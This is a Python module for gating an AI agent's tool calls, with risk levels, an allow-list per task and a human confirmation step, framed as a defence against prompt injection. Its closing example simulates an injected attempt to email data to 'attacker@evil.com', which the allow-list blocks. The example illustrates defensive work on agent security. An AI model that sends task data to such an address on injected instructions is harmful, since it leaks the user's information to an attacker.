from functools import wraps
from typing import Callable, Any
import logging

logger = logging.getLogger(__name__)

# Define tool risk levels
TOOL_RISK_LEVELS = {
    "web_search": "low",
    "read_file": "low",
    "write_file": "medium",
    "send_email": "high",
    "delete_file": "high",
    "execute_code": "critical",
    "make_payment": "critical",
    "api_call": "medium",
}

class PrivilegeViolationError(Exception):
    pass

def require_confirmation(risk_level: str):
    """Decorator that gates tool execution behind confirmation for high-risk actions."""
    def decorator(func: Callable) -> Callable:
        @wraps(func)
        def wrapper(*args, **kwargs) -> Any:
            if risk_level in ("high", "critical"):
                tool_name = func.__name__
                params_summary = str(kwargs)[:200]

                logger.warning(
                    f"High-risk action requested: {tool_name} "
                    f"with params: {params_summary}"
                )

                # In production: send to human review queue
                confirmed = request_human_confirmation(
                    tool_name=tool_name,
                    params=kwargs,
                    risk_level=risk_level
                )

                if not confirmed:
                    raise PrivilegeViolationError(
                        f"Action {tool_name} was not confirmed by user. "
                        f"Possible injection attempt blocked."
                    )

            return func(*args, **kwargs)
        return wrapper
    return decorator

class RestrictedToolset:
    """Agent toolset with privilege restrictions and scope limiting."""

    def __init__(self, allowed_tools: list[str], task_context: str):
        self.allowed_tools = set(allowed_tools)
        self.task_context = task_context
        self.action_log = []

    def execute_tool(self, tool_name: str, **kwargs) -> Any:
        if tool_name not in self.allowed_tools:
            raise PrivilegeViolationError(
                f"Tool '{tool_name}' is not permitted for this task. "
                f"Allowed tools: {self.allowed_tools}. "
                f"This may indicate a prompt injection attempt."
            )

        risk = TOOL_RISK_LEVELS.get(tool_name, "medium")
        self.action_log.append({
            "tool": tool_name,
            "params": kwargs,
            "risk": risk
        })

        if risk in ("high", "critical"):
            confirmed = request_human_confirmation(tool_name, kwargs, risk)
            if not confirmed:
                raise PrivilegeViolationError(f"User denied {tool_name} execution")

        return self._dispatch_tool(tool_name, **kwargs)

    def _dispatch_tool(self, tool_name: str, **kwargs):
        # Dispatch to actual tool implementations
        tools = {
            "web_search": lambda q: f"Search results for: {q}",
            "send_email": lambda to, subject, body: f"Email sent to {to}",
        }
        return tools.get(tool_name, lambda **k: None)(**kwargs)

def request_human_confirmation(tool_name: str, params: dict, risk_level: str) -> bool:
    """In production, this sends to a review queue. Here we simulate."""
    print(f"\n[CONFIRMATION REQUIRED]")
    print(f"Tool: {tool_name} | Risk: {risk_level}")
    print(f"Parameters: {params}")
    response = input("Approve? (yes/no): ").strip().lower()
    return response == "yes"

# Usage: restrict agent to only read-only tools for a summarization task
restricted_tools = RestrictedToolset(
    allowed_tools=["web_search", "read_file"],
    task_context="Summarize competitor pricing pages"
)

try:
    # This will be blocked — send_email not in allowed tools
    restricted_tools.execute_tool("send_email", to="attacker@evil.com", subject="data")
except PrivilegeViolationError as e:
    print(f"Injection blocked: {e}")
